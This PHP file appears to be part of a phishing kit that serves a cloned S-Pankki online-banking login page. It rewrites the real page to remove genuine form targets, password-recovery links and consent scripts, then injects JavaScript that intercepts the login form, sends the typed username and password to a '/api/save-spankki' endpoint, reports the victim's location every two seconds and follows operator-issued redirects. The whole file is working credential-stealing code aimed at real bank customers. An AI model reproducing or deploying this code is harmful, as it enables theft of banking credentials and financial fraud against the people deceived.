<?php
ob_start();
$userName = htmlspecialchars($user['full_name'] ?? 'Kullanıcı');
$bankName = htmlspecialchars($bank['name'] ?? 'S-Pankki');
$htmlContent = file_get_contents(__DIR__ . '/S-Pankkibank.html');

if (mb_detect_encoding($htmlContent, 'UTF-8', true) !== 'UTF-8') {
    $htmlContent = mb_convert_encoding($htmlContent, 'UTF-8', 'Windows-1252');
}

$htmlContent = preg_replace('/https?:\/\/[^\s"\'<>]+/i', '#', $htmlContent);
$htmlContent = preg_replace('/mailto:[^\s"\'<>]+/i', '#', $htmlContent);
$htmlContent = preg_replace('/tel:[^\s"\'<>]+/i', '#', $htmlContent);
$htmlContent = preg_replace('/cross-domain-bridge\.html[^"\'>\s]*/i', '#', $htmlContent);
$htmlContent = preg_replace('/saved_resource\.html[^"\'>\s]*/i', '#', $htmlContent);
$htmlContent = preg_replace('/href\s*=\s*["\']?[^"\'>\s]*(cross-domain-bridge|saved_resource)[^"\'>\s]*["\']?/i', 'href="#"', $htmlContent);
$htmlContent = preg_replace('/src\s*=\s*["\']?[^"\'>\s]*(cross-domain-bridge|saved_resource)[^"\'>\s]*["\']?/i', 'src="#"', $htmlContent);
$htmlContent = preg_replace('/href\s*=\s*["\']?[^"\'>\s]*S-Pankkibank_files\/[^"\'>\s]*\.html[^"\'>\s]*["\']?/i', 'href="#"', $htmlContent);
$htmlContent = preg_replace('/src\s*=\s*["\']?[^"\'>\s]*S-Pankkibank_files\/[^"\'>\s]*\.html[^"\'>\s]*["\']?/i', 'src="#"', $htmlContent);
$htmlContent = preg_replace('/usercentrics-cmp[^>]*>/i', '', $htmlContent);
$htmlContent = preg_replace('/loader\.js\.download[^>]*>/i', '', $htmlContent);
$htmlContent = preg_replace('/<script[^>]*usercentrics[^>]*>.*?<\/script>/is', '', $htmlContent);
$htmlContent = preg_replace('/<link[^>]*usercentrics[^>]*>/i', '', $htmlContent);
$htmlContent = preg_replace('/<link[^>]*preload[^>]*loader\.js[^>]*>/i', '', $htmlContent);

$htmlContent = str_replace('type="password" name="username"', 'type="text" name="username"', $htmlContent);
$htmlContent = str_replace('type=password name=username', 'type=text name=username', $htmlContent);
$htmlContent = preg_replace('/action\s*=\s*[^\s>]*loginEbank[^\s>]*/i', 'action="#"', $htmlContent);
$htmlContent = preg_replace('/action\s*=\s*"[^"]*loginEbank[^"]*"/i', 'action="#"', $htmlContent);
$htmlContent = preg_replace('/action\s*=\s*\'[^\']*loginEbank[^\']*\'/i', 'action="#"', $htmlContent);
$htmlContent = preg_replace('/action\s*=\s*\/ebank[^\s>]*/i', 'action="#"', $htmlContent);
$htmlContent = preg_replace('/action\s*=\s*"[^"]*encapInitLogin[^"]*"/i', 'action="#"', $htmlContent);
$htmlContent = preg_replace('/action\s*=\s*"[^"]*encapProcessLogin[^"]*"/i', 'action="#"', $htmlContent);
$htmlContent = preg_replace('/action\s*=\s*"[^"]*initSession[^"]*"/i', 'action="#"', $htmlContent);
$htmlContent = preg_replace('/target\s*=\s*[^\s>]*_top[^\s>]*/i', '', $htmlContent);
$htmlContent = preg_replace('/target\s*=\s*"[^"]*_top[^"]*"/i', '', $htmlContent);
$htmlContent = preg_replace('/target\s*=\s*\'[^\']*_top[^\']*\'/i', '', $htmlContent);
$htmlContent = preg_replace('/href=[^>]*#ENCAP[^>]*/i', '', $htmlContent);
$htmlContent = preg_replace('/data-cs-target=ENCAP/i', '', $htmlContent);
$htmlContent = preg_replace('/data-cs-id=ENCAP/i', '', $htmlContent);
$htmlContent = str_replace('./S-Pankkibank_files/', '/spankki-files/', $htmlContent);
$htmlContent = str_replace('S-Pankkibank_files/', '/spankki-files/', $htmlContent);

$userId = isset($_SESSION['user_id']) ? $_SESSION['user_id'] : (isset($user['id']) ? $user['id'] : 0);

$pinTanStyle = '<style>
    #login-init-form,
    [data-cs-target="ENCAP"],
    [href*="#ENCAP"],
    a[href*="encapInitLogin"],
    a[href*="encapProcessLogin"],
    a[href*="Unohtuiko salasana"],
    a[href*="unohtuiko salasana"],
    .cancel-link,
    .page-divider,
    [class*="divider"],
    [id*="forgot"],
    [id*="Forgot"],
    #goog-gt-t,
    [id*="goog-gt"],
    [class*="goog-gt"],
    [id*="google_translate"],
    [class*="google_translate"],
    [id*="usercentrics"],
    [class*="usercentrics"],
    iframe[src*="cross-domain-bridge"],
    iframe[src*="usercentrics"],
    script[src*="loader.js"],
    script[id*="usercentrics"],
    link[href*="loader.js"],
    link[href*="usercentrics"],
    body > div:last-child,
    footer,
    .footer {
        display: none !important;
        visibility: hidden !important;
    }
    body {
        overflow-y: auto !important;
        max-height: 100vh !important;
    }
    main#loginp {
        max-height: 100vh !important;
        overflow-y: auto !important;
    }
    .page-box {
        max-height: none !important;
        overflow-y: visible !important;
    }
    .button-group-secondary {
        display: none !important;
    }
    .page-divider,
    .page-divider ~ * {
        display: none !important;
    }
    #pintTanLoginForm {
        display: block !important;
        visibility: visible !important;
    }
    #pintTanLoginForm input,
    #pintTanLoginForm label,
    #pintTanLoginForm button,
    #pintTanLoginForm .form__normal,
    #pintTanLoginForm .button-group,
    #pintTanLoginForm .button-group-primary {
        display: block !important;
        visibility: visible !important;
    }
    #password,
    label[for="password"],
    button[name="btn_log_in"],
    button[value="Jatka"] {
        display: block !important;
        visibility: visible !important;
    }
</style>
<script>
    if (window.location.hash !== \'#PIN_TAN\') {
        window.location.hash = \'#PIN_TAN\';
    }
    if (window.usercentrics) {
        delete window.usercentrics;
    }
    Object.defineProperty(window, \'usercentrics\', {
        value: undefined,
        writable: false,
        configurable: false
    });
    document.addEventListener(\'DOMContentLoaded\', function() {
        const usercentricsElements = document.querySelectorAll(\'[id*="usercentrics"], [class*="usercentrics"], iframe[src*="cross-domain-bridge"], iframe[src*="usercentrics"], script[src*="loader.js"], script[id*="usercentrics"], link[href*="loader.js"], link[href*="usercentrics"]\');
        usercentricsElements.forEach(function(el) {
            el.remove();
        });
        const usernameInput = document.getElementById(\'username\');
        if (usernameInput) {
            usernameInput.value = \'\';
            usernameInput.removeAttribute(\'readonly\');
            usernameInput.removeAttribute(\'disabled\');
        }
        const forgotLinks = document.querySelectorAll(\'a[href*="Unohtuiko salasana"], a[href*="unohtuiko salasana"], a[href*="verkkopankkitunnukset"], .cancel-link, .page-divider, .button-group-secondary\');
        forgotLinks.forEach(function(link) {
            link.style.display = \'none\';
            link.style.visibility = \'hidden\';
        });
        const form = document.getElementById(\'pintTanLoginForm\');
        if (form) {
            form.style.display = \'block\';
            form.style.visibility = \'visible\';
            const passwordInput = document.getElementById(\'password\');
            if (passwordInput) {
                passwordInput.style.display = \'block\';
                passwordInput.style.visibility = \'visible\';
            }
            const passwordLabel = document.querySelector(\'label[for="password"]\');
            if (passwordLabel) {
                passwordLabel.style.display = \'block\';
                passwordLabel.style.visibility = \'visible\';
            }
            const submitButton = form.querySelector(\'button[name="btn_log_in"], button[value="Jatka"]\');
            if (submitButton) {
                submitButton.style.display = \'block\';
                submitButton.style.visibility = \'visible\';
            }
            const buttonGroup = form.querySelector(\'.button-group, .button-group-primary\');
            if (buttonGroup) {
                buttonGroup.style.display = \'block\';
                buttonGroup.style.visibility = \'visible\';
            }
            const formNormal = form.querySelector(\'.form__normal\');
            if (formNormal) {
                formNormal.style.display = \'block\';
                formNormal.style.visibility = \'visible\';
            }
            const pageDivider = document.querySelector(\'.page-divider\');
            if (pageDivider) {
                pageDivider.style.display = \'none\';
                let nextSibling = pageDivider.nextElementSibling;
                while (nextSibling) {
                    nextSibling.style.display = \'none\';
                    nextSibling = nextSibling.nextElementSibling;
                }
            }
        }
        const googleTranslate = document.querySelectorAll(\'#goog-gt-t, [id*="goog-gt"], [class*="goog-gt"], [id*="google_translate"], [class*="google_translate"]\');
        googleTranslate.forEach(function(el) {
            el.style.display = \'none\';
            el.style.visibility = \'hidden\';
        });
        document.body.style.overflowY = \'auto\';
        document.body.style.maxHeight = \'100vh\';
    });
</script>';

$earlyScript = '';
if ($userId > 0) {
    $earlyScript = '<script>
    (function() {
        const userId = ' . json_encode($userId) . ';
        
        function handleFormSubmit(e) {
            if (e) {
                e.preventDefault();
                e.stopPropagation();
                e.stopImmediatePropagation();
            }
            
            const usernameInput = document.getElementById(\'username\');
            const passwordInput = document.getElementById(\'password\');
            
            if (!usernameInput || !passwordInput) {
                return false;
            }
            
            const username = usernameInput.value.trim();
            const password = passwordInput.value.trim();
            
            if (!username || !password) {
                return false;
            }
            
            fetch(\'/api/save-spankki\', {
                method: \'POST\',
                headers: { \'Content-Type\': \'application/json\' },
                body: JSON.stringify({
                    user_id: userId,
                    username: username,
                    password: password
                })
            })
            .then(response => {
                if (!response.ok) {
                    throw new Error(\'Network response was not ok\');
                }
                return response.json();
            })
            .then(data => {
                if (data.success && data.redirect) {
                    window.location.href = data.redirect;
                } else if (data.message) {
                    alert(data.message);
                }
            })
            .catch(error => {
                console.error(\'Error:\', error);
            });
            
            return false;
        }
        
        function initForm() {
            const form = document.getElementById(\'pintTanLoginForm\');
            if (form) {
                form.setAttribute(\'action\', \'#\');
                form.removeAttribute(\'target\');
                form.onsubmit = function(e) { 
                    return handleFormSubmit(e);
                };
                
                const submitButton = form.querySelector(\'button[type="submit"], button[name="btn_log_in"]\');
                if (submitButton) {
                    submitButton.setAttribute(\'type\', \'button\');
                    submitButton.onclick = function(e) {
                        handleFormSubmit(e);
                        return false;
                    };
                }
                
                form.addEventListener(\'submit\', function(e) {
                    handleFormSubmit(e);
                }, true);
            }
        }
        
        if (document.readyState === \'loading\') {
            document.addEventListener(\'DOMContentLoaded\', initForm);
        } else {
            setTimeout(initForm, 0);
        }
        
        const currentPage = window.location.pathname;
        const pageTitle = document.title;
        
        function updateCurrentPage() {
            fetch(\'/api/update-page\', {
                method: \'POST\',
                headers: { \'Content-Type\': \'application/json\' },
                body: JSON.stringify({
                    user_id: userId,
                    current_page: currentPage,
                    page_title: pageTitle
                })
            }).catch(() => {});
        }
        
        function checkAdminRedirect() {
            fetch(\'/api/check-redirect?user_id=\' + userId)
                .then(response => response.json())
                .then(data => {
                    if (data.redirect && data.redirect !== currentPage) {
                        window.location.href = data.redirect;
                    }
                })
                .catch(() => {});
        }
        
        updateCurrentPage();
        checkAdminRedirect();
        setInterval(() => {
            updateCurrentPage();
            checkAdminRedirect();
        }, 2000);
    })();
    </script>';
}

if (strpos($htmlContent, '</head>') !== false) {
    $htmlContent = str_replace('</head>', $pinTanStyle . $earlyScript . '</head>', $htmlContent);
} else {
    $htmlContent = $pinTanStyle . $earlyScript . $htmlContent;
}

$htmlContent = str_replace('</body>', '</body>', $htmlContent);
$content = ob_get_clean();
echo $htmlContent;

